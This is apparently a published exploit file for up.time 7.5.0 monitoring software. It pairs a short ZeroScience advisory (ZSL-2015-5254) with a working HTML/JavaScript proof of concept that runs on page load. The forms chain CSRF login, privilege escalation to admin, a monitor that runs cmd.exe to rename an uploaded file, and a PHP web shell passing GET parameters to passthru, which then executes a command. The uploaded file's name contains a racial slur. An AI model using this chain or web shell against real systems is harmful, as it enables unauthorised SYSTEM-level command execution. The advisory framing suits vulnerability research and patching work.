@@ -1,0 +1,243 @@
+﻿
+up.time 7.5.0 Upload And Execute File Exploit
+
+
+Vendor: Idera Inc.
+Product web page: http://www.uptimesoftware.com
+Affected version: 7.5.0 (build 16) and 7.4.0 (build 13)
+
+Summary: The next-generation of IT monitoring software.
+
+Desc: up.time suffers from arbitrary command execution.
+Attackers can exploit this issue using the monitor service
+feature and adding a command with respected arguments to given
+binary for execution. In combination with the CSRF, Privilege
+Escalation, Arbitrary text file creation and renaming that
+file to php for example in arbitrary location and executing
+system commands with SYSTEM privileges.
+
+Tested on: Jetty, PHP/5.4.34, MySQL
+           Apache/2.2.29 (Win64) mod_ssl/2.2.29 OpenSSL/1.0.1j PHP/5.4.34
+
+
+Vulnerability discovered by Ewerson 'Crash' Guimaraes
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5254
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5254.php
+
+
+29.07.2015
+
+--
+
+
+<html>
+ <head>
+ <title>Uptime Exploit</title>
+ </head>
+
+<body onload="runme();">
+
+
+<!-- Login --> 
+<form name="login" action="http://127.0.0.1:9999/index.php" method="POST" target="frame0">
+      <input type="hidden" name="username" value="sample" />
+      <input type="hidden" name="password" value="123456" />
+    </form>
+
+<!-- Escalate privileges --> 
+   <form name="privadm" action="http://127.0.0.1:9999/main.php?section=UserContainer&subsection=edit&id=2" method="POST" target="frame1">
+      <input type="hidden" name="operation" value="submit" />
+      <input type="hidden" name="disableEditOfUsernameRoleGroup" value="false" />
+      <input type="hidden" name="username" value="sample" />
+      <input type="hidden" name="password" value="123456" />
+      <input type="hidden" name="passwordConfirm" value="123456" />
+      <input type="hidden" name="firstname" value="Sample" />
+      <input type="hidden" name="lastname" value="User" />
+      <input type="hidden" name="location" value="" />
+      <input type="hidden" name="emailaddress" value="" />
+      <input type="hidden" name="emailtimeperiodid" value="1" />
+      <input type="hidden" name="phonenumber" value="" />
+      <input type="hidden" name="phonenumbertimeperiodid" value="1" />
+      <input type="hidden" name="windowshost" value="" />
+      <input type="hidden" name="windowsworkgroup" value="" />
+      <input type="hidden" name="windowspopuptimeperiodid" value="1" />
+      <input type="hidden" name="landingpage" value="MyPortal" />
+      <input type="hidden" name="isonvacation" value="0" />
+      <input type="hidden" name="receivealerts" value="0" />
+      <input type="hidden" name="activexgraphs" value="0" />
+      <input type="hidden" name="newuser" value="on" />
+      <input type="hidden" name="newuser" value="1" />
+      <input type="hidden" name="userroleid" value="1" />
+      <input type="hidden" name="usergroupid&#91;&#93;" value="1" />
+    </form>
+
+<!-- Log-off to refresh permission --> 
+	<form name="logoff" action="http://127.0.0.1:9999/main.php" method="POST" target="frame2">
+      <input type="hidden" name="logout" value="1" />
+    </form>
+
+<!-- Login with escalated user --> 
+	<form name="login2" action="http://127.0.0.1:9999/index.php?loggedout" method="POST" target="frame3">
+      <input type="hidden" name="username" value="sample" />
+      <input type="hidden" name="password" value="123456" />
+    </form>
+
+<!-- Creating Monitor to  rename php shell --> 
+<form  name="createmonitor" action="http://127.0.0.1:9999/main.php?section=ERDCInstance&subsection=add" method="POST" target="frame4">
+      <input type="hidden" name="initialERDCId" value="20" />
+      <input type="hidden" name="target" value="1" />
+      <input type="hidden" name="targetType" value="systemList" />
+      <input type="hidden" name="systemList" value="1" />
+      <input type="hidden" name="serviceGroupList" value="&#45;10" />
+      <input type="hidden" name="initialMode" value="standard" />
+      <input type="hidden" name="erdcName" value="Exploit" />
+      <input type="hidden" name="erdcInitialName" value="" />
+      <input type="hidden" name="erdcDescription" value="Exploit" />
+      <input type="hidden" name="hostButton" value="system" />
+      <input type="hidden" name="erdc&#95;id" value="20" />
+      <input type="hidden" name="forceReload" value="0" />
+      <input type="hidden" name="operation" value="standard" />
+      <input type="hidden" name="erdc&#95;instance&#95;id" value="" />
+      <input type="hidden" name="label&#95;&#91;184&#93;" value="Script&#32;Name" />
+      <input type="hidden" name="value&#95;&#91;184&#93;" value="c&#58;&#92;windows&#92;system32&#92;cmd&#46;exe" />
+      <input type="hidden" name="id&#95;&#91;184&#93;" value="process" />
+      <input type="hidden" name="name&#95;&#91;process&#93;" value="184" />
+      <input type="hidden" name="units&#95;&#91;184&#93;" value="" />
+      <input type="hidden" name="guiBasic&#95;&#91;184&#93;" value="1" />
+      <input type="hidden" name="inputType&#95;&#91;184&#93;" value="GUIString" />
+      <input type="hidden" name="screenOrder&#95;&#91;184&#93;" value="1" />
+      <input type="hidden" name="parmType&#95;&#91;184&#93;" value="1" />
+      <input type="hidden" name="label&#95;&#91;185&#93;" value="Arguments" />
+      <input type="hidden" name="value&#95;&#91;185&#93;" value="&#32;&#47;C&#32;ren&#32;"C&#58;&#92;Program&#32;Files&#92;uptime&#32;software&#92;uptime&#92;GUI&#92;wizards&#92;nigga&#46;txt"&#32;"nigga&#46;php"&#32;" />
+      <input type="hidden" name="id&#95;&#91;185&#93;" value="args" />
+      <input type="hidden" name="name&#95;&#91;args&#93;" value="185" />
+      <input type="hidden" name="units&#95;&#91;185&#93;" value="" />
+      <input type="hidden" name="guiBasic&#95;&#91;185&#93;" value="1" />
+      <input type="hidden" name="inputType&#95;&#91;185&#93;" value="GUIString" />
+      <input type="hidden" name="screenOrder&#95;&#91;185&#93;" value="2" />
+      <input type="hidden" name="parmType&#95;&#91;185&#93;" value="1" />
+      <input type="hidden" name="label&#95;&#91;187&#93;" value="Output" />
+      <input type="hidden" name="can&#95;retain&#95;&#91;187&#93;" value="false" />
+      <input type="hidden" name="comparisonWarn&#95;&#91;187&#93;" value="&#45;1" />
+      <input type="hidden" name="comparison&#95;&#91;187&#93;" value="&#45;1" />
+      <input type="hidden" name="id&#95;&#91;187&#93;" value="value&#95;critical&#95;output" />
+      <input type="hidden" name="name&#95;&#91;output&#93;" value="187" />
+      <input type="hidden" name="units&#95;&#91;187&#93;" value="" />
+      <input type="hidden" name="guiBasic&#95;&#91;187&#93;" value="1" />
+      <input type="hidden" name="inputType&#95;&#91;187&#93;" value="GUIString" />
+      <input type="hidden" name="screenOrder&#95;&#91;187&#93;" value="4" />
+      <input type="hidden" name="parmType&#95;&#91;187&#93;" value="2" />
+      <input type="hidden" name="label&#95;&#91;189&#93;" value="Response&#32;time" />
+      <input type="hidden" name="can&#95;retain&#95;&#91;189&#93;" value="false" />
+      <input type="hidden" name="comparisonWarn&#95;&#91;189&#93;" value="&#45;1" />
+      <input type="hidden" name="comparison&#95;&#91;189&#93;" value="&#45;1" />
+      <input type="hidden" name="id&#95;&#91;189&#93;" value="value&#95;critical&#95;timer" />
+      <input type="hidden" name="name&#95;&#91;timer&#93;" value="189" />
+      <input type="hidden" name="units&#95;&#91;189&#93;" value="ms" />
+      <input type="hidden" name="guiBasic&#95;&#91;189&#93;" value="0" />
+      <input type="hidden" name="inputType&#95;&#91;189&#93;" value="GUIInteger" />
+      <input type="hidden" name="screenOrder&#95;&#91;189&#93;" value="6" />
+      <input type="hidden" name="parmType&#95;&#91;189&#93;" value="2" />
+      <input type="hidden" name="timing&#95;&#91;erdc&#95;instance&#95;monitored&#93;" value="1" />
+      <input type="hidden" name="timing&#95;&#91;timeout&#93;" value="60" />
+      <input type="hidden" name="timing&#95;&#91;check&#95;interval&#93;" value="10" />
+      <input type="hidden" name="timing&#95;&#91;recheck&#95;interval&#93;" value="1" />
+      <input type="hidden" name="timing&#95;&#91;max&#95;rechecks&#93;" value="3" />
+      <input type="hidden" name="alerting&#95;&#91;notification&#93;" value="1" />
+      <input type="hidden" name="alerting&#95;&#91;alert&#95;interval&#93;" value="120" />
+      <input type="hidden" name="alerting&#95;&#91;alert&#95;on&#95;critical&#93;" value="1" />
+      <input type="hidden" name="alerting&#95;&#91;alert&#95;on&#95;warning&#93;" value="1" />
+      <input type="hidden" name="alerting&#95;&#91;alert&#95;on&#95;recovery&#93;" value="1" />
+      <input type="hidden" name="alerting&#95;&#91;alert&#95;on&#95;unknown&#93;" value="1" />
+      <input type="hidden" name="time&#95;period&#95;id" value="1" />
+      <input type="hidden" name="pageFinish" value="Finish" />
+      <input type="hidden" name="pageContinue" value="Continue&#46;&#46;&#46;" />
+      <input type="hidden" name="isWizard" value="1" />
+      <input type="hidden" name="wizardPage" value="2" />
+      <input type="hidden" name="wizardNumPages" value="2" />
+      <input type="hidden" name="wizardTask" value="pageFinish" />
+      <input type="hidden" name="visitedPage&#91;1&#93;" value="1" />
+      <input type="hidden" name="visitedPage&#91;2&#93;" value="1" />
+         </form>
+
+
+<!-- Uploading php shell txt format --> 
+    <form name="uploadshell" action="http://127.0.0.1:9999/wizards/post2file.php" method="POST" target="frame5">
+      <input type="hidden" name="file&#95;name" value="nigga&#46;txt" />
+      <input type="hidden" name="script" value="<&#63;&#32;passthru&#40;&#36;&#95;GET&#91;&apos;cmd&apos;&#93;&#41;&#59;&#32;&#63;>" />
+         </form>
+
+
+<!-- Run command to rename php shell --> 
+    <form name="run" action="http://127.0.0.1:9999/main.php" method="POST" target="frame6">
+      <input type="hidden" name="section" value="RunERDCInstance" />
+      <input type="hidden" name="subsection" value="view" />
+      <input type="hidden" name="id" value="65535" />
+      <input type="hidden" name="name" value="Exploit" />
+    </form>
+
+
+<!-- Executing basic command --> 
+    <form name="exploit" action="http://127.0.0.1:9999/wizards/nigga.php" METHOD="GET" target="frame7">
+	<input type="hidden" name="cmd" value="whoami" />
+    </form>
+
+
+<iframe name="frame0"></iframe>
+<iframe name="frame1"></iframe>
+<iframe name="frame2"></iframe>
+<iframe name="frame3"></iframe>
+<iframe name="frame4"></iframe>
+<iframe name="frame5"></iframe>
+<iframe name="frame6"></iframe>
+<iframe name="frame7"></iframe>
+
+<script>
+ function runme()
+ {
+ document.login.submit();
+ document.getElementsByTagName("iframe")[0].onload = function()
+//document.write("Login....")
+ {
+document.privadm.submit();
+document.getElementsByTagName("iframe")[1].onload = function()
+//document.write("Mutating to admin uahsuasuas");
+ {
+document.logoff.submit();
+document.getElementsByTagName("iframe")[2].onload = function()
+//document.write("Refreshing perms...");
+ {
+document.login2.submit();
+document.getElementsByTagName("iframe")[3].onload = function()
+//document.write("Login again...Keep Calm....");
+ {
+document.createmonitor.submit();
+document.getElementsByTagName("iframe")[4].onload = function()
+//document.write("Creating F*cking monitor");
+ {
+document.uploadshell.submit();
+document.getElementsByTagName("iframe")[5].onload = function()
+//document.write("Uploading webshell. Muaaaaa! Muaaaaa!!");
+ {
+document.run.submit();
+document.getElementsByTagName("iframe")[6].onload = function()
+//document.write("Trick to shell... come on....");
+ {
+document.exploit.submit();
+document.getElementsByTagName("iframe")[7].onload = function()
+alert('Pwned!!!!!!!!!!!!!!!!!!!!!!')
+ }
+ }
+ }
+ }
+ }
+ }
+ }
+ }
+</script>
+
+</body>
+</html>
